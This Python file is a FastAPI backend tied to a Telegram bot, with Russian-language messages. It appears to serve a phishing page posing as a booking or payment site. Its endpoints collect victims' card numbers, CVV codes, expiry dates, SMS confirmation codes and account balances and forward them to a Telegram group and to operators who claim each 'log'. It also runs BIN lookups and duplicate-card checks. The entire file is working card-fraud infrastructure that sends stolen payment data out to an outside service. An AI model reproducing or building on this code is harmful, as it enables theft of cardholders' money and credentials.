from fastapi import FastAPI
from aiogram import Bot
import datetime
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from database.crud import get_log_by_session, create_or_update_log, find_card_duplicates
from api.handy_api import get_card_info, format_card_info
from bot.keyboards import get_take_log_keyboard
import config

def register_endpoints(app: FastAPI, bot: Bot):
    
    @app.post("/notify")
    async def notify(data: dict):
        try:
            session_id = data["sessionId"]
            masked_pan = data["maskedPan"]
            booking_id = data.get("bookingId", session_id[:8].upper())
            client_id = data["clientId"]
            step = data.get("step", "full")
            
            # Создаем/обновляем лог
            create_or_update_log(session_id, masked_pan, booking_id, client_id, step)
            
            # Проверяем дубликаты
            duplicates = find_card_duplicates(masked_pan)
            previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
            
            if step == "card_number_only":
                bin_number = masked_pan[:6]
                card_info = await get_card_info(bin_number)
                card_info_text = format_card_info(card_info)
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"🆔 #{booking_id} || #{client_id}\n"
                    f"🎯 Пользователь ввел карту, приготовиться!\n\n"
                    f"💳 Номер карты:\n"
                    f"🔹 <code>{masked_pan}</code>\n"
                    f"🔹 <code>{card_with_spaces}</code>\n\n\n"
                    f"{card_info_text}\n\n"
                    f"⏳ Ожидаем CVV и expiry date..."
                )
                
                await bot.send_message(config.GROUP_ID_TEST, message_text, parse_mode="HTML")
                
            else:
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"🆔 #{booking_id} || #{client_id}\n"
                    f"🔔 Пользователь ожидает 🔔\n\n"
                    f"💳 Номер карты:\n\n"
                    f"🔹 <code>{masked_pan}</code>\n"
                    f"🔹 <code>{card_with_spaces}</code>\n\n"
                )
                
                await bot.send_message(
                    config.GROUP_ID_TEST, 
                    message_text, 
                    parse_mode="HTML", 
                    reply_markup=get_take_log_keyboard(session_id)
                )

            return {"status": "ok"}
        
        except Exception as e:
            print(f"Error in /notify: {e}")
            return {"status": "error", "message": str(e)}, 500

    @app.post("/balance-notify")
    async def balance_notify(data: dict):
        session_id = data["sessionId"]
        balance = data["balance"]

        log = get_log_by_session(session_id)
        if log:
            booking_id = log['booking_id']
            client_id = log['client_id']

            if log and log['taken_by']:
                await bot.send_message(
                    log['taken_by'],
                    f"#{booking_id} || #{client_id}\n\n"
                    f"✅ Баланс юзера получен!\n\n💰 Сумма: {balance} AED"
                )
        return {"status": "ok"}

    @app.post("/sms-notify")
    async def sms_notify(data: dict):
        session_id = data["sessionId"]
        sms = data["sms"]

        log = get_log_by_session(session_id)
        if log:
            booking_id = log['booking_id']
            client_id = log['client_id']

            if log and log['taken_by']:
                await bot.send_message(
                    log['taken_by'],
                    f"#{booking_id} || #{client_id}\n\n"
                    f"✅ Код смс получен!\n\n🔢 Код: {sms}"
                )
        return {"status": "ok"}

    @app.post("/change-card-notify")
    async def change_card_notify(data: dict):
        try:
            session_id = data["sessionId"]
            changed_card = data["changed_card"].strip()
            changed_expire = data["changed_expire"]
            changed_cvv = data["changed_cvv"]
          
            # Очищаем номер карты от пробелов
            card_without_spaces = changed_card.replace(' ', '')

            log = get_log_by_session(session_id)
            if not log:
                return {"status": "error", "message": "Log not found"}
                
            booking_id = log['booking_id']
            client_id = log['client_id']

            if log and log['taken_by']:
                # Проверяем дубликаты ПЕРЕД сохранением новой карты
                duplicates = find_card_duplicates(card_without_spaces)
                # Теперь НЕ исключаем текущий session_id - показываем если карта вообще была в истории
                previous_uses = duplicates if duplicates else []
                
                # Сохраняем новую карту в историю ПОСЛЕ проверки дубликатов
                if card_without_spaces and len(card_without_spaces) >= 6:
                    create_or_update_log(session_id, card_without_spaces, booking_id, client_id, "changed_card")
                
                # Получаем информацию о новой карте через Handy API
                card_info_text = ""
                if card_without_spaces and len(card_without_spaces) >= 6:
                    bin_number = card_without_spaces[:6]
                    card_info = await get_card_info(bin_number)
                    card_info_text = format_card_info(card_info)
                else:
                    card_info_text = "❌ Неверный номер карты"
               
                # Формируем сообщение
                message = f"#{booking_id} || #{client_id}\n\n"
                
                # Добавляем предупреждение о дубликате, если карта использовалась ранее
                if previous_uses:
                    message += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
                
                message += (
                    f"✅ Юзер изменил карту\n\n"
                    f"🔄💳 Новая карта: <code>{card_without_spaces}</code>\n"
                    f"🔄🗓️ Новый срок действия карты: {changed_expire}\n"
                    f"🔄🔒 Новый CVV: {changed_cvv}\n\n"
                    f"📊 <b>Информация о карте:</b>\n"
                    f"{card_info_text}"
                )

                await bot.send_message(
                    log['taken_by'],
                    message,
                    parse_mode="HTML"
                )

            return {"status": "ok"}
            
        except Exception as e:
            print(f"Error in /change-card-notify: {e}")
            import traceback
            traceback.print_exc()
            return {"status": "error", "message": str(e)}, 500